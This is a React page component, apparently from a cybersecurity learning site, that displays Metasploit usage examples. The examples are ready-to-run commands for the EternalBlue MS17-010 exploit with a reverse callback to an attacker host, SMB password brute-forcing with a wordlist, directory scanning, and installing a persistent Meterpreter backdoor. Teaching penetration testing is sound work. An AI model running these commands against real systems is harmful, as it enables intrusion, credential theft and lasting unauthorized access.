'use client'
import { useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import CodeBlock from '@/components/base/Codeblock';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

export default function MetasploitExamplesPage() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-amber/10 border border-cyber-amber/20 text-cyber-amber text-xs font-medium font-mono mb-4">
          <i className="ri-file-list-line" />
          Metasploit Examples
        </div>
        <DocHeading level={1}>Usage Examples</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Real-world Metasploit commands for common exploitation scenarios.
        </p>
      </motion.div>

      <motion.section className="mt-8 space-y-6" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="cyber-card p-5">
          <h3 className="text-sm font-semibold text-white mb-2">EternalBlue Exploit</h3>
          <p className="text-xs text-cyber-text mb-3">Exploit MS17-010 on Windows 7/2008.</p>
          <CodeBlock code={`use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 10.0.0.1
set LPORT 4444
exploit`} />
        </div>

        <div className="cyber-card p-5">
          <h3 className="text-sm font-semibold text-white mb-2">SMB Login Scanner</h3>
          <p className="text-xs text-cyber-text mb-3">Check for valid SMB credentials.</p>
          <CodeBlock code={`use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt.txt
run`} />
        </div>

        <div className="cyber-card p-5">
          <h3 className="text-sm font-semibold text-white mb-2">HTTP Directory Scanner</h3>
          <p className="text-xs text-cyber-text mb-3">Find hidden directories on web servers.</p>
          <CodeBlock code={`use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set PATH /
run`} />
        </div>

        <div className="cyber-card p-5">
          <h3 className="text-sm font-semibold text-white mb-2">Meterpreter Persistence</h3>
          <p className="text-xs text-cyber-text mb-3">Install a persistent backdoor.</p>
          <CodeBlock code={`run post/windows/manage/persistence
set SESSION 1
set LHOST 10.0.0.1
set LPORT 4444
run`} />
        </div>

        <div className="cyber-card p-5">
          <h3 className="text-sm font-semibold text-white mb-2">Resource Script</h3>
          <p className="text-xs text-cyber-text mb-3">Save commands to automate exploitation.</p>
          <CodeBlock code={`# save as exploit.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 10.0.0.1
exploit`} />
          <p className="text-xs text-cyber-text mt-2">Run with: <code className="text-cyber-amber">msfconsole -r exploit.rc</code></p>
        </div>
      </motion.section>

      <motion.section className="mt-12 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="mt-8 flex gap-3">
          <a href="/metasploit/lab" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Lab Exercises <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/metasploit/pro-tips" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-amber hover:text-cyber-amber transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}